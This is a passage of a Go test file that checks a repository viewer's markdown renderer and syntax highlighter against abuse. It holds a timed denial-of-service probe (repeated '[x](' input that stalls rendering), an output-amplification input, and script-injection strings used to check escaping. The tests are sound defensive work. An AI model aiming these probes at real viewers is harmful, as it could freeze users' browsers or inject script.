// nested-inline shapes, so measured on this machine "[x](" repeated cost 0.77s
// at 50KB, 3.0s at 100KB and 12.1s at 200KB. The repository view renders a
// README the moment it opens (RepoFileView sets asMarkdown off the .md
// extension and loads immediately), so this is zero-click for whoever publishes
// the DOC, and the frontend's loadToken only discards the result — it cannot
// stop the work.
func TestRenderMarkdownSafe_TimeBudget(t *testing.T) {
	// 200KB of this measured 12.1s unbounded, six times the budget.
	source := strings.Repeat("[x](", 50000)
	if len(source) > maxMarkdownBytes {
		t.Fatalf("the probe is %d bytes, past the %d-byte input cap; it would be refused for the wrong reason", len(source), maxMarkdownBytes)
	}

	start := time.Now()
	html, err := renderMarkdownSafe(source)
	elapsed := time.Since(start)

	if err == nil {
		t.Fatalf("expected the render to be given up on, got %d bytes of HTML", len(html))
	}
	if html != "" {
		t.Fatalf("a failed render must return nothing, got %d bytes", len(html))
	}
	// Generous slack over the budget so this does not flake on a loaded machine,
	// while still failing outright if the budget is not applied at all.
	if elapsed > markdownRenderBudget+3*time.Second {
		t.Fatalf("render took %s against a %s budget", elapsed, markdownRenderBudget)
	}
}

// TestConvertMarkdown_OutputCap pins the SECOND gate, using a shape the time
// budget does not catch.
//
// A ```js fence measured 200KB in → 3.98MB out in 0.57 seconds on this machine:
// x19.9 amplification, well inside the render budget. That HTML would go
// straight to Svelte's {@html}, so a cheap parse still becomes a multi-megabyte
// DOM built on the UI thread.
//
// It calls convertMarkdown rather than renderMarkdownSafe ON PURPOSE. Going
// through the wrapper would race the 2s budget, and under -race this render is
// slow enough to trip it — the test would then pass on the timeout and stop
// proving the size gate at all. convertMarkdown is where the gate lives.
func TestConvertMarkdown_OutputCap(t *testing.T) {
	source := "```js\n" + strings.Repeat("var a=1;\n", 200000/9)
	if len(source) > maxMarkdownBytes {
		t.Fatalf("the probe is %d bytes, past the %d-byte input cap", len(source), maxMarkdownBytes)
	}

	html, err := convertMarkdown(source)

	if err == nil {
		t.Fatalf("expected the render to be refused on size, got %d bytes of HTML", len(html))
	}
	if html != "" {
		t.Fatalf("a refused render must return nothing, got %d bytes", len(html))
	}
}

// TestRenderMarkdownSafe_OrdinaryDocumentStillRenders is the counterweight: the
// two gates above must not fire on anything a real README does.
func TestRenderMarkdownSafe_OrdinaryDocumentStillRenders(t *testing.T) {
	var b strings.Builder
	for i := 0; i < 2000; i++ {
		b.WriteString("## Section\n\nSome prose with a [link](https://example.com) and `code`.\n\n- one\n- two\n\n")
	}

	html, err := renderMarkdownSafe(b.String())
	if err != nil {
		t.Fatalf("an ordinary %d-byte document was refused: %v", b.Len(), err)
	}
	if !strings.Contains(html, "<h2>") {
		t.Fatal("rendered HTML carries no headings")
	}
}

// TestHighlightSource_CompressedNamesMatchTheirLexer pins the fix for the defect
// found by looking at vault.tela on screen: index.html.gz displayed obvious HTML
// under a "PLAINTEXT" badge with no colour, because chroma matches on the last
// extension and only ever saw ".gz".
//
// The assertion is against the uncompressed name rather than a hard-coded
// language string, because chroma's display names are its business, not ours.
func TestHighlightSource_CompressedNamesMatchTheirLexer(t *testing.T) {
	cases := []struct {
		bare    string
		content string
	}{
		{"index.html", "<!DOCTYPE html>\n<html><body><p>hi</p></body></html>"},
		{"styles.css", "body { color: #fff; }"},
		{"scripts.js", "const a = 1;\nfunction f() { return a; }"},
	}

	for _, c := range cases {
		want := highlightSource(c.bare, c.content)
		if want.Language == "plaintext" {
			t.Fatalf("%s: precondition failed, the uncompressed name does not resolve to a lexer", c.bare)
		}

		for _, ext := range telaCompressionSuffixes {
			name := c.bare + ext
			got := highlightSource(name, c.content)
			if got.Language != want.Language {
				t.Errorf("%s reported %q, want %q (same as %s)", name, got.Language, want.Language, c.bare)
			}
			if !strings.Contains(got.HTML, "<span") {
				t.Errorf("%s produced no highlight spans, so it rendered as flat text", name)
			}
		}
	}
}

// ---------------------------------------------------------------------------
// per-line output
// ---------------------------------------------------------------------------

// stripAndUnescapeLine reduces one Lines entry back to the source text it
// renders: chroma's own spans removed, entities unescaped. Valid for both
// producers of an entry - chroma output and the EscapeString fallback - because
// the fallback contains no markup at all.
func stripAndUnescapeLine(entry string) string {
	return html.UnescapeString(chromaSpanRe.ReplaceAllString(entry, ""))
}

// sourceLines is the expectation the countLines rule implies: a terminating
// newline ends the last line rather than starting an empty one.
func sourceLines(content string) []string {
	if content == "" {
		return nil
	}
	return strings.Split(strings.TrimSuffix(content, "\n"), "\n")
}

// TestHighlightSource_LineCount pins one entry per source line under the
// countLines rule. The multi-line literal cases are the load-bearing ones: a
// raw string is ONE token spanning several lines, so a formatter that does not
// split tokens collapses those lines into one entry and fails here.
func TestHighlightSource_LineCount(t *testing.T) {
	cases := []struct {
		name     string
		filename string
		content  string
		want     int
	}{
		{"trailing newline", "x.js", "var a = 1;\nvar b = 2;\n", 2},
		{"no trailing newline", "x.js", "var a = 1;\nvar b = 2;\nvar c = 3;", 3},
		{"empty content", "x.js", "", 0},
		{"lone newline", "x.js", "\n", 1},
		{"crlf endings", "x.js", "var a = 1;\r\nvar b = 2;\r\n", 2},
		// Lone \r pins the count-mismatch guard: chroma's EnsureLF rewrites it
		// to \n, so highlightLines yields more entries than countLines and the
		// guard MUST fall back to escapeLines. Trusting highlightLines here
		// would shift every line number after the \r.
		{"classic-mac lone cr", "x.js", "var a = 1;\rvar b = 2;\rvar c = 3;", 1},
		{"stray cr mid file", "x.js", "a\rb\nc\n", 2},
		{"js template literal spanning lines", "x.js", "const s = `one\ntwo\nthree\nfour`;\nconst t = 1;\n", 5},
		{"go raw string spanning lines", "main.go", "package main\n\nvar s = `a\nb\nc`\n", 5},
		{"unicode content", "x.js", "// café naïve 你好\nvar x = \"🔒\";\n", 2},
		{"unrecognised extension", "noext", "line one\nline two\n", 2},
	}
	for _, c := range cases {
		c := c
		t.Run(c.name, func(t *testing.T) {
			r := highlightSource(c.filename, c.content)
			if len(r.Lines) != c.want {
				t.Fatalf("len(Lines) = %d, want %d\nlines: %q", len(r.Lines), c.want, r.Lines)
			}
			// The rule and countLines must never drift apart: the diff view and
			// the numbered file view describe the same file.
			if got := countLines(c.content); len(r.Lines) != got {
				t.Fatalf("len(Lines) = %d but countLines = %d", len(r.Lines), got)
			}
			for i, line := range r.Lines {
				if strings.ContainsRune(line, '\n') {
					t.Errorf("line %d carries a newline: %q", i, line)
				}
				// A raw \r survives html.EscapeString, and the HTML parser
				// turns it back into \n - an extra visual line under one
				// number. No entry may carry one.
				if strings.ContainsRune(line, '\r') {
					t.Errorf("line %d carries a carriage return: %q", i, line)
				}
			}
		})
	}
}

// TestHighlightSource_LinesPreserveContent is the round trip: stripping
// chroma's spans and unescaping each entry must reproduce the source line for
// line, in order. This is what fails loudly if a multi-line token is not split
// (its text lands on the wrong entries) or if the count is off by one (every
// comparison after the slip fails).
func TestHighlightSource_LinesPreserveContent(t *testing.T) {
	cases := []struct{ filename, content string }{
		{"x.js", "var a = 1;\nvar b = \"<script>alert(1)</script>\";\nvar c = 3;\n"},
		{"x.js", "const s = `one\ntwo\nthree\nfour`;\nconst t = 1;"},
		{"main.go", "package main\n\nvar s = `<b>\n&amp;\n</b>`\n"},
		{"index.html", "<html>\n<body onload=\"x()\">\n</body>\n</html>\n"},
		{"noext", "plain <script>alert(1)</script>\nsecond & line\n"},
		{"x.js", "// café 你好\nvar x = \"🔒\";\n"},
	}
	for _, c := range cases {
		c := c
		t.Run(c.filename+" "+c.content[:min(20, len(c.content))], func(t *testing.T) {
			r := highlightSource(c.filename, c.content)
			want := sourceLines(c.content)
			if len(r.Lines) != len(want) {
				t.Fatalf("len(Lines) = %d, want %d", len(r.Lines), len(want))
			}
			for i, entry := range r.Lines {
				// Each entry must be individually injectable: nothing outside
				// chroma's own spans may open a tag.
				assertOnlyChromaSpans(t, entry)
				if got := stripAndUnescapeLine(entry); got != want[i] {
					t.Errorf("line %d round-trips to %q, want %q", i, got, want[i])
				}
			}
		})
	}
}

// TestHighlightSource_LinesAreHighlighted pins that ordinary source gets
// chroma output per line, not the escaped fallback. The count-mismatch guard
// in highlightSource repairs a broken line splitter by degrading to escaped
// text - safe, but a silent loss of highlighting - so a defect in the split or
// an off-by-one in highlightLines surfaces HERE rather than nowhere.
func TestHighlightSource_LinesAreHighlighted(t *testing.T) {
	// No blank lines, and a token (the template literal) spanning lines 0-2,
	// so every entry must carry a coloured span of its own.
	r := highlightSource("x.js", "const s = `one\ntwo\nthree`;\nconst t = 1;\n")
	if !r.Highlighted {
		t.Fatalf("not highlighted: %q", r.Reason)
	}
	if len(r.Lines) != 4 {
		t.Fatalf("len(Lines) = %d, want 4", len(r.Lines))
	}
	for i, line := range r.Lines {
		if !strings.Contains(line, `<span style="color:#`) {
			t.Errorf("line %d has no chroma span - the per-line path fell back to escaped text: %q", i, line)
		}
	}
}

// TestHighlightSource_LinesFallbackEscaped pins that the fallback path escapes
// PER LINE: above maxHighlightBytes no chroma runs, so if the per-line
// EscapeString were removed, these entries would carry the raw payload.
func TestHighlightSource_LinesFallbackEscaped(t *testing.T) {
	const hostile = "<script>alert(1)</script>"
	// Lines long enough that the byte cap trips while the line count stays
	// under maxNumberedLines, so this test exercises the escape, not the cap.
	line := strings.Repeat(hostile, 3)
	content := strings.Repeat(line+"\n", maxHighlightBytes/len(line))
	if len(content) <= maxHighlightBytes {
		t.Fatalf("test setup: content is only %d bytes", len(content))
	}
	if n := countLines(content); n > maxNumberedLines {
		t.Fatalf("test setup: %d lines is over maxNumberedLines", n)
	}
	r := highlightSource("x.js", content)
	if r.Reason != "too large to highlight" {
		t.Fatalf("reason = %q, want %q", r.Reason, "too large to highlight")
	}
	if got, want := len(r.Lines), countLines(content); got != want {
		t.Fatalf("len(Lines) = %d, want %d", got, want)
	}
	wantLine := html.EscapeString(line)
	for i, line := range r.Lines {
		if line != wantLine {
			t.Fatalf("line %d = %q, want %q", i, line, wantLine)
		}
	}
}

// TestHighlightSource_LinesCapped pins maxNumberedLines: every Lines entry
// becomes a table row, so a newline-dense file under the byte caps ("a\n"
// repeated fits ~1M lines inside maxPlaintextBytes) must NOT come back per
// line - the viewer falls back to the single-block HTML instead. Both the
// highlighted path and the too-large-to-highlight fallback are covered,
// because each assigns Lines at its own site.
func TestHighlightSource_LinesCapped(t *testing.T) {
	t.Run("at the cap, still numbered", func(t *testing.T) {
		r := highlightSource("x.js", strings.Repeat("a\n", maxNumberedLines))
		if len(r.Lines) != maxNumberedLines {
			t.Fatalf("len(Lines) = %d, want %d", len(r.Lines), maxNumberedLines)
		}
	})
	t.Run("over the cap, highlighted path", func(t *testing.T) {
		content := strings.Repeat("a\n", maxNumberedLines+1)
		if len(content) > maxHighlightBytes {
			t.Fatalf("test setup: %d bytes hits the byte cap, not the line cap", len(content))
		}
		r := highlightSource("x.js", content)
		if len(r.Lines) != 0 {
			t.Fatalf("over the cap produced %d lines", len(r.Lines))
		}
		if r.HTML == "" {
			t.Fatal("no single-block HTML to fall back to")
		}
	})
	t.Run("over the cap, too large to highlight", func(t *testing.T) {
		content := strings.Repeat("a\n", maxHighlightBytes)
		r := highlightSource("x.js", content)
		if r.Reason != "too large to highlight" {
			t.Fatalf("reason = %q", r.Reason)
		}
		if len(r.Lines) != 0 {
			t.Fatalf("over the cap produced %d lines", len(r.Lines))
		}
		if r.HTML == "" {
			t.Fatal("no single-block HTML to fall back to")
		}
	})
}

// TestHighlightSource_LinesAbsentWhenContentDropped: the two paths that return
// no HTML must return no lines either - the content was refused, not rendered.
func TestHighlightSource_LinesAbsentWhenContentDropped(t *testing.T) {
	t.Run("binary", func(t *testing.T) {
		r := highlightSource("logo.png", "line\x00one\nline two\n")
		if r.Reason != "binary" {
			t.Fatalf("reason = %q", r.Reason)
		}
		if len(r.Lines) != 0 {
			t.Fatalf("binary content produced %d lines", len(r.Lines))
		}
	})
	t.Run("over the plaintext cap", func(t *testing.T) {
		r := highlightSource("x.js", strings.Repeat("a\n", maxPlaintextBytes/2+1))
		if r.Reason != "too large" {
			t.Fatalf("reason = %q", r.Reason)
		}
		if len(r.Lines) != 0 {
			t.Fatalf("dropped content produced %d lines", len(r.Lines))
		}
	})
}

// TestEscapeLines covers the helper's line rule directly, since both fallback
// paths and the count-mismatch guard depend on it agreeing with countLines.
func TestEscapeLines(t *testing.T) {
	cases := []struct {
		in   string
		want []string
	}{
		{"", nil},
		{"a", []string{"a"}},
		{"a\n", []string{"a"}},
		{"\n", []string{""}},
		{"a\n\n", []string{"a", ""}},
		{"a\nb", []string{"a", "b"}},
		{"<x>\n&\n", []string{"&lt;x&gt;", "&amp;"}},
		// Carriage returns are dropped, never passed through: escaped, they
		// re-emerge as line breaks under a single number.
		{"a\rb", []string{"ab"}},
		{"a\r\nb\r\n", []string{"a", "b"}},
	}
	for _, c := range cases {
		got := escapeLines(c.in)
		if len(got) != len(c.want) {
			t.Errorf("escapeLines(%q) = %q, want %q", c.in, got, c.want)
			continue
		}
		for i := range got {
			if got[i] != c.want[i] {
				t.Errorf("escapeLines(%q)[%d] = %q, want %q", c.in, i, got[i], c.want[i])
			}
		}
		if len(got) != countLines(c.in) {
			t.Errorf("escapeLines(%q) has %d entries, countLines says %d", c.in, len(got), countLines(c.in))
		}
	}
}

// TestLexerName covers the helper directly, including the case that must NOT be
// stripped: a compression suffix is only a suffix, never a whole name.
func TestLexerName(t *testing.T) {
	cases := map[string]string{
		"index.html.gz":    "index.html",
		"styles.css.br":    "styles.css",
		"app.js":           "app.js",
		"README.md":        "README.md",
		"archive.gz":       "archive",
		"sub/dir/a.css.gz": "sub/dir/a.css",
	}
	for in, want := range cases {
		if got := lexerName(in); got != want {
			t.Errorf("lexerName(%q) = %q, want %q", in, got, want)
		}
	}
}
